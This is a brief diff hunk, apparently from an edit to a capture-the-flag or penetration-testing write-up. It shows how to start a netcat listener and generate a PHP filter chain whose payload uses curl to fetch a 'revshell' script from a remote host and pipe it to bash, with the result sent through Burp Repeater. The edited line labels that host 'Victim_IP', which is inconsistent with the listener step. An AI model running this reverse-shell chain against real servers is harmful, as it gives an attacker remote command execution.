@@ -30,7 +30,7 @@ Run nc -lvnp 1234
 
 Create the chain command with the python script:
 
-python3 php_filter_chain_generator.py --chain ‘curl -s -L YOUR_IP/revshell|bash ?>’
+python3 php_filter_chain_generator.py --chain '<?= `curl -s -L Victim_IP/revshell|bash` ?>'
 
 Pass the output in Repeater in Burp 
 
